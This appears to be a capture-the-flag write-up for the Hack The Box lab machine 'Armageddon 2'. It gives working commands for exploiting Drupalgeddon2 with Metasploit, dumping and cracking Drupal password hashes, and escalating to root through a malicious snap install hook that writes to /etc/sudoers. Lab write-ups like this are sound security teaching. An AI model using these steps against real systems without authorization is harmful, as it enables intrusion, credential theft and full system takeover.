# Armageddon 2 - Hack The Box Writeup

## Overview

**Machine:** Armageddon 2
**Platform:** Hack The Box
**Difficulty:** Easy (Linux)

### Attack Chain

1. Enumerated the web application and identified **Drupal 7**.
2. Confirmed the target was vulnerable to **Drupalgeddon2 (CVE-2018-7600)**.
3. Used the Metasploit Drupalgeddon2 module to gain remote code execution.
4. Retrieved database credentials from the Drupal configuration.
5. Extracted user password hashes from the database.
6. Cracked the administrator password.
7. Logged in via SSH as the recovered user.
8. Enumerated sudo privileges.
9. Abused a misconfigured `snap install` sudo rule to gain root privileges.

---

# Enumeration

After the initial reconnaissance, the web application was identified as **Drupal 7**.

Since this version is known to be affected by **Drupalgeddon2 (CVE-2018-7600)**, it became the primary attack vector.

---

# Initial Access

The machine was vulnerable to **CVE-2018-7600**, allowing authenticated and unauthenticated remote code execution on vulnerable Drupal installations.

The Metasploit module was used to obtain an initial shell:

```bash
msfconsole

use exploit/unix/webapp/drupal_drupalgeddon2

set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>

run
```

After successful exploitation, a shell was obtained on the target.

---

# Database Enumeration

Drupal stores its database configuration inside:

```text
sites/default/settings.php
```

The following credentials were recovered:

```php
'database' => 'drupal',
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj',
'host' => 'localhost',
```

---

# Dumping User Hashes

Instead of interacting directly with MySQL from the shell, a simple PHP script was uploaded to the web server to query the database.

```php
<?php
try {
    $db = new PDO('mysql:host=localhost;dbname=drupal',
                  'drupaluser',
                  'CQHEy@9M*m23gBVj');

    foreach($db->query('SELECT * FROM users') as $row){
        echo $row['name'] . ":" . $row['pass'] . "\n";
    }
}
catch(PDOException $e){
    echo $e->getMessage();
}
?>
```

Visiting the page displayed all Drupal usernames and password hashes.

---

# Cracking the Password

Drupal 7 hashes use Hashcat mode **7900**.

```bash
hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
Username: brucetherealadmin
Password: booboo
```

---

# User Access

SSH access was now possible using the recovered credentials.

```bash
ssh brucetherealadmin@<TARGET_IP>
```

After logging in, the user flag was located inside the user's home directory.

---

# Privilege Escalation

## Sudo Enumeration

Checking the user's sudo permissions revealed:

```bash
sudo -l
```

Output:

```text
/usr/bin/snap install *
```

This configuration allowed the user to install Snap packages as root.

---

# Building a Malicious Snap Package

A malicious installation hook was created.

```bash
mkdir -p /tmp/native_snap/meta/hooks
```

Installation hook:

```sh
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Save it as:

```text
/tmp/native_snap/meta/hooks/install
```

Make it executable:

```bash
chmod +x /tmp/native_snap/meta/hooks/install
```

Compile the Snap package:

```bash
mksquashfs /tmp/native_snap /tmp/badsnap_2.0_amd64.snap -noappend -comp xz
```

---

# Initial Attempt

The package was installed:

```bash
sudo snap install /tmp/badsnap_2.0_amd64.snap --dangerous --devmode
```

The payload executed, but the created SUID binary was immediately removed by Snap's sandboxing behavior.

---

# Bypassing the Sandbox

Instead of creating a SUID binary, the installation hook modified `/etc/sudoers`.

Updated installation hook:

```sh
#!/bin/sh
echo "brucetherealadmin ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

Since Snap caches package versions, the version number inside `snap.yaml` was incremented.

```bash
sed -i "s/version: '2.0'/version: '3.0'/g" \
/tmp/native_snap/meta/snap.yaml \
2>/dev/null || \
sed -i "s/version: '1.0'/version: '3.0'/g" \
/tmp/native_snap/meta/snap.yaml
```

Rebuild the package:

```bash
mksquashfs /tmp/native_snap /tmp/badsnap_3.0_amd64.snap -noappend -comp xz
```

Install it:

```bash
sudo snap install /tmp/badsnap_3.0_amd64.snap --dangerous --devmode
```

---

# Root Access

After the malicious installation hook modified the sudoers file, the user was granted unrestricted sudo privileges.

Spawn a root shell:

```bash
sudo su
```

Enter the user's password:

```text
booboo
```

Root access was successfully obtained.

---

# Lessons Learned

* Always fingerprint CMS versions during enumeration.
* Public exploits such as Drupalgeddon2 can quickly provide initial access when software is outdated.
* Configuration files frequently expose sensitive credentials.
* Database credentials can often lead to lateral movement or credential reuse.
* Misconfigured sudo rules should always be investigated carefully.
* Allowing unrestricted `snap install` via sudo can result in full privilege escalation through malicious installation hooks.

---

# Attack Summary

```
Drupal 7
        │
        ▼
CVE-2018-7600 (Drupalgeddon2)
        │
        ▼
Remote Shell
        │
        ▼
settings.php
        │
        ▼
Database Credentials
        │
        ▼
Dump Drupal Users
        │
        ▼
Crack Password Hash
        │
        ▼
SSH Login (brucetherealadmin)
        │
        ▼
sudo -l
        │
        ▼
snap install *
        │
        ▼
Malicious Snap Package
        │
        ▼
Modify /etc/sudoers
        │
        ▼
sudo su
        │
        ▼
ROOT
```
